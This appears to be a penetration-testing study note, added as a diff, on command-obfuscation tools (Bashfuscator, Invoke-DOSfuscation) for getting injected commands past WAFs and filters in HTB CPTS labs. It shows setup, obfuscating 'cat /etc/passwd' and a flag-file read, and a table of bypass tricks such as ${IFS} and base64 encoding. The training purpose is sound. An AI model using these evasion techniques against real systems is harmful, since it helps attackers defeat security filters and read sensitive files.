@@ -1,0 +1,94 @@
+🧠 Summary: Command Evasion Tools
+When basic obfuscation (quotes, IFS, string building) doesn’t cut it — usually due to WAFs, layered filters, or advanced parsing — you turn to automated evasion tools to auto-obfuscate payloads.
+
+These tools generate massive or mangled versions of a payload that still run correctly but are hard to detect.
+
+🛠️ Tools Covered
+Tool	Platform	Purpose
+Bashfuscator	Linux	Obfuscates bash commands
+DOSfuscation	Windows	Obfuscates CMD/PowerShell commands
+🔧 Bashfuscator (Linux)
+➤ Setup:
+bash
+Copy
+Edit
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+➤ Usage:
+bash
+Copy
+Edit
+cd ./bashfuscator/bin
+./bashfuscator -c 'cat /etc/passwd'
+🔁 This will default to random obfuscation layers, possibly massive output (even millions of chars).
+
+➤ Refined usage (shorter):
+bash
+Copy
+Edit
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+➤ Result:
+Produces obfuscated eval-style code like:
+
+bash
+Copy
+Edit
+eval "$(W0=(w \  t e c p s a \/ d);for Ll in ...;{ printf %s "${W0[$Ll]}";};)"
+➡️ Then test with:
+
+bash
+Copy
+Edit
+bash -c '<outputted_command>'
+🧪 Test in Burp:
+Replace spaces if needed
+
+If blocked, assume character-level filters are hitting you again — combine this with char obfuscation techniques (IFS, base64, etc.)
+
+🪟 DOSfuscation (Windows)
+➤ Setup:
+powershell
+Copy
+Edit
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+➤ Usage (Interactive):
+powershell
+Copy
+Edit
+Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+Invoke-DOSfuscation> encoding
+Invoke-DOSfuscation\Encoding> 1
+➤ Output:
+powershell
+Copy
+Edit
+typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:...etc
+That looks like absolute soup, but it works, because Windows will resolve those environment variables and substring operators correctly.
+
+✅ Test in:
+
+powershell
+Copy
+Edit
+CMD, PowerShell, or pwsh (on Linux)
+💣 ITTTT: “If This, Then Try That” Flow
+Got This	Do That
+Basic obfuscation fails	Use Bashfuscator or DOSfuscation
+Output too large from Bashfuscator	Use --no-mangling --layers 1 -s 1 -t 1
+Obfuscated command fails in Burp	Replace with ${IFS} or %09
+Still blocked?	Try char/word obfuscation inside Bashfuscator manually
+Can’t run DOSfuscation (no Windows)	Use pwsh on Kali or Pwnbox
+Need complete stealth from WAF	Encode with base64/hex, decode inside command
+🔍 Patterns & Tips
+These tools don't guess what's allowed — you still need to adapt output. Combine with manual tricks if needed.
+
+Layered encoding (e.g., base64 + eval) = heavy-duty evasion.
+
+Keep an eye on eval, echo, printf, rev, <<<, etc. in output — you'll recognize the obfuscation style after a few runs.
+
+In CPTS, you’ll likely use this only when basic + mid-level bypasses fail. Don’t jump straight to it unless you’re blocked hard.
